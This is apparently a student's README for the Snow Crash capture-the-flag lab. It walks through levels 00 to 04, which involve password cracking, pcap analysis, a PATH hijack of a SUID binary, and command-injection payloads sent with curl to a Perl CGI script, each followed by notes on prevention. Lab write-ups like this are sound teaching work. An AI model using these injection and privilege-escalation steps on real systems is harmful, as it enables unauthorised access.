# snow-crash
## Overview
This repository contains the source code and resources for the "Snow Crash" Capture The Flag (CTF) challenge.
The challenge is designed to test participants' skills in various areas of cybersecurity, 
including reverse engineering, cryptography, web exploitation, and binary exploitation.

## requirements
- `SnowCrash.iso`: The ISO file for the Snow Crash VM. (This ressource is not included in the repository you can ask for.)
- Docker: The CTF environment is containerized using Docker, so you will need to have Docker installed on your machine to run the challenge.
- QEMU: To run the Snow Crash VM, you will need to have QEMU installed on your machine.
    ``` bash
    # For Debian/Ubuntu-based systems:
    sudo apt-get update
    sudo apt-get install qemu qemu-kvm
    ```



## Utils
### `Makefile`: 
This file contains a set of commands to manage the CTF environment using Docker. 
It includes targets for building the Docker image, starting and stopping the container, and cleaning up resources.
#### Commands:
- `make ctf_build`: Builds the Docker image for the CTF environment.
- `make ctf_up`: Starts the Docker container for the CTF environment.
- `make ctf_down`: Stops the Docker container for the CTF environment.
- `make ctf_clean`: Removes the Docker container for the CTF environment.
- `make ctf_clean_all`: Prunes all unused Docker resources, including images, containers, networks, and volumes.

### Find the ssh port snow-crash VM is listening on:
1. If is bridge networking:
```bash
    # run the following command on the host machine to find the Port number the Snow Crash VM is listening on:
    nmap -p- <VM_IP_ADDRESS> #on the VM run `ip a` to find the IP address
```
2. If is NAT networking:
```bash
    cat /etc/ssh/sshd_config | grep Port #on the VM run the above command to find the Port number the Snow Crash VM is listening on
    ss -tuln | grep <Port_number> #on the VM run the above command to confirm that the Snow Crash VM is listening on the specified port
``` 


### Running the Snow Crash VM with QEMU:
```bash
    qemu-system-x86_64 -hda snow-crash.qcow2 -m 2048 -net user,hostfwd=tcp::<hostPort>-:<guestPort> -net nic -nographic
```
Replace `<hostPort>` and `<guestPort>` with the appropriate port numbers for your setup.
#### Commands:
- `make run`: Runs the Snow Crash VM with the specified qemu configuration.
#### SSH Access:
- To access the Snow Crash VM via SSH from your host machine, use the following command:
```bash
    ssh user@localhost -p <hostPort>
```
Replace `<hostPort>` with the port number you specified in the qemu command for port forwarding.


- To access the Snow Crash VM via SSH from the Docker container, use the following command:
```bash
    # If NAT networking is used: 
    ssh user@<HostMachineIP> -p <hostPort>
    # If bridge networking is used:
    ssh user@<VM_IP_ADDRESS> -p <Port_number>
    # to find the IP address run the following command:
    ifconfig #or
    ip a
```
Replace `<HostMachineIP>` with the IP address of the host machine and `<hostPort>` with the port number you specified in the qemu command for port forwarding.

### Level00:
- use **find** to search everything related to the flag00 user in the SnowCrash machine where level00 has rights:
```bash
    RESULT=$(find / -user flag00 2>/dev/null)
    echo $RESULT
```
- we find two files:
    - /usr/sbin/john 
    - /rofs/usr/sbin/john
    - The both files contains the same string: `cdiiddwpgswtgt` which is Caesar code with a shift of 11
    - so we can decode it to get :  `nottoohardhere` using the script in file `level00/ressources/caesar_decode.sh`:
```bash
    # run the following command to decode the string:
    bash level00/ressources/caesar_decode.sh
    # the output will be:
    Decoded content: nottoohardhere
```
- This code is the password for the user flag00, so we can use it to swap to the user flag00 and get the flag for level01:

```bash
    su flag00
    # enter the password: nottoohardhere
    # then run the following command to get the flag for level01:
    getflag
```
- The flag for level01 is: `the result of getflag` which is in the file `level00/flag`

### Level01:
- Swap to the user flag01 and enter the password which is the flag for level01:
```bash
    su flag01
    # enter the password: the result of getflag
```
- Find the password for the user flag01:
```bash
    PASSWORD=$(cat /etc/passwd | grep flag01 | awk -F: '{print $2}')
    echo $PASSWORD
```
- We get this string: `42hDRfypTqqnw` 
- We use john the ripper to decode this string and get the password for the user flag01:
```bash
    # The script is in the file `level01/ressources/john_the_ripper.sh`
    bash level01/ressources/john_the_ripper.sh
    # the output will be:
    Password for flag01: abcdefg
```
- swap to the user flag01 using the password we just found and get the flag for level02:
```bash
    su flag01
    # enter the password: abcdefg
    # then run the following command to get the flag for level02:
    getflag
```
- The flag for level02 is: `the result of getflag` which is in the file `level01/flag`

### Level02:
- Swap to the user level02 and enter the password which is the flag for level01:
```bash
    su level02
    # enter the password: the result of getflag
```
- In the home directory of the user level02 we find a file named `flag02.pcap`
which is a packet capture file that contains network traffic data.
like below:
```bash
    level02@SnowCrash:~$ ls -l
    total 12
    ----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
```
- we can analyze this file using Wireshark or tshark to find the flag for level03:
```bash
    # To analyze the file using tshark, run the following command:
    tshark -r level02.pcap -z follow,tcp,ascii,0
```
- We get the password for the user flag02 which is: `the result of the above command`
- swap to the user flag02 using the password we just found and get the flag for level03:
```bash
    su flag02
    # enter the password: the result of the above command
    # then run the following command to get the flag for level03:
    getflag
```
- The flag for level03 is: `the result of getflag` which is in the file `level02/flag`
### Level03:
- Swap to the user level03 and enter the password which is the flag for level02:
```bash    
    su level03
    # enter the password: the result of getflag
```
- In the home directory of the user level03 we find a file named `flag03` 
```bash 
    level03@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
    level03@SnowCrash:~$ ./level03 
    Exploit me
```
- This file is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag03**.
- We can decompile this binary using objdump if you can read assembly code:
```bash
    objdump -d level03
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash
    # i use this platform to decompile the binary: 
    https://dogbolt.org/
```
- We get something like this :
```c
    int32_t main(int argc, char** argv, char** envp)
    {
        gid_t eax = getegid();
        uid_t eax_1 = geteuid();
        setresgid(eax, eax, eax);
        setresuid(eax_1, eax_1, eax_1);
        return system("/usr/bin/env echo Exploit me");
    }
```

#### Analysis:
- The binary is using the `getegid()` and `geteuid()` functions to get the **effective group ID** and **effective user ID** of the process, which are the IDs (flag03) of the user that executed the binary (in this case, any user that executes the binary will have the effective IDs of the user flag03).
- Then it uses the `setresgid()` and `setresuid()` functions to set the real, effective, and saved group ID and user ID of the process to the values obtained from `getegid()` and `geteuid()`, which means that the process will run with the privileges of the user flag03.
- Finally, it uses the `system()` function to execute the command `echo Exploit me` with the privileges of the user flag03.

#### Vulnerability:
##### Type: Command Injection
- The vulnerability in this binary is that it uses the combination of `setresgid()`, `setresuid()`, and `system()` functions without properly sanitizing the **environment variables** (e.g., `PATH`) or/and the command being executed.
- This allows an attacker to manipulate the environment variables or the command being executed to execute arbitrary commands with the privileges of the user flag03, which can lead to privilege escalation and potentially compromise the entire system if the user flag03 has high privileges.


#### Exploitation:
- To exploit this binary, we can create a malicious script that will be executed by the `system()` function with the privileges of the user flag03. 
- We can create a script named `echo` with the following content:
```bash
    #!/bin/bash
    # This script will be executed with the privileges of the user flag03
    # We can use it to run the getflag to get the flag for level04
    echo "getflag" > /tmp/echo
    chmod +x /tmp/echo
    export PATH=/tmp:$PATH
    ./level03
    # Result is the flag for level04 which is in the file `level03/flag`
```
#### Prevention:
- To prevent this type of vulnerability, the binary should properly sanitize the environment variables and the command being executed. 
- For example, it should use an absolute path for the command being executed (e.g., `/usr/bin/env`) and should not allow the user to manipulate the `PATH` environment variable. 
- Additionally, it should use a more secure method for executing commands, such as `execve()` instead of `system()`, which does not invoke a shell and therefore reduces the risk of command injection.

#### conclusion:
- By exploiting the vulnerability in the `level03` binary, we can execute arbitrary commands with the privileges of the user flag03, which allows us to get the flag for level04 and progress through the CTF challenge. 
- This highlights the importance of properly sanitizing environment variables and commands when developing software, especially when dealing with privileged operations, to prevent potential security vulnerabilities and protect the integrity of the system.

### Level04:
- Swap to the user level04 and enter the password which is the flag for level03:
```bash
    su level04
    # enter the password: the result of getflag stored in level03/flag
```
- In the home directory of this user we find this file:
```bash
    level04@SnowCrash:~$ la -la
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
    level04@SnowCrash:~$ cat level04.pl
```
```perl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
        $y = $_[0];
        print `echo $y 2>&1`;
    }
    x(param("x"));
```
- The CGI script is likely being served by a web server, and it listens on port 4747, so we can access it through a web browser or a tool like `curl` to send requests to the server.
- This is a simple Perl script that takes a parameter from the URL and prints it out. However, it is vulnerable to command injection because it directly executes the input through the `backtick operator` **( \`  \` )** as a shell command without any sanitization.
- The `param("x")` function retrieves the value of the `x` parameter from the URL query string, and then it is passed to the `echo` command, which is executed in the shell.

##### Type: Command Injection
- The vulnerability in this script is that it allows an attacker to inject arbitrary commands through the `x` parameter in the URL. 
- For example, an attacker could access the URL `http://localhost:4747/?x=;ls` to execute the `ls` command on the server, which would list the files in the current directory. 
- This could lead to further exploitation if the attacker can access sensitive files or execute more complex commands.
#### Exploitation:
- To exploit this vulnerability, we can use a web browser or a tool like `curl` to send a request to the server with a malicious payload in the `x` parameter. 
- For example, we can give value to x as `test` to see the output of the command `echo test`:
```bash
    curl "http://localhost:4747/?x=test"
    # The output will be:
    test
```
- Also, we can try to execute a more complex command, such as `ls -all` to list the files in the current directory:
```bash
    curl --get --data-urlencode "x=;ls -all" http://localhost:4747
    # The output will be the list of files in the current directory
    total 4
    dr-xr-x---+ 2 flag04 level04  60 Mar 19 14:14 .
    drwxr-xr-x  1 root   root    100 Mar 19 14:14 ..
    -r-xr-x---+ 1 flag04 level04 152 Mar 19 14:14 level04.pl
```
-Now, we can execute the `getflag` command to get the flag for level05:
```bash
    curl --get --data-urlencode "x=;getflag" http://localhost:4747
    # The output will be the flag for level05 which is in the file `level04/flag`
```
#### Prevention:
- Use the backtick operator ( \`  \` ) to execute commands in Perl is dangerous because it allows for command injection if the input is not properly sanitized.
- To prevent this type of vulnerability, the script should properly sanitize the input from the `x` parameter to ensure that it does not contain any malicious commands. 
- This can be done by using a whitelist of allowed commands or by escaping special characters that could be used for command injection.
- ***Good practice***: it is generally recommended to avoid using the backtick operator for executing commands and instead use a more secure method, such as the `system()` function with proper argument handling, to reduce the risk of command injection.
```perl
    # Example of using system() with proper argument handling:
    use IPC::System::Simple qw(system);
    sub x {
        my $y = param("x");
        # Validate or sanitize $y here before using it
        # Use the absolute path for the command to prevent PATH manipulation
        # separate the command and its arguments to prevent command injection
        system("/usr/bin/echo", $y);
    }
```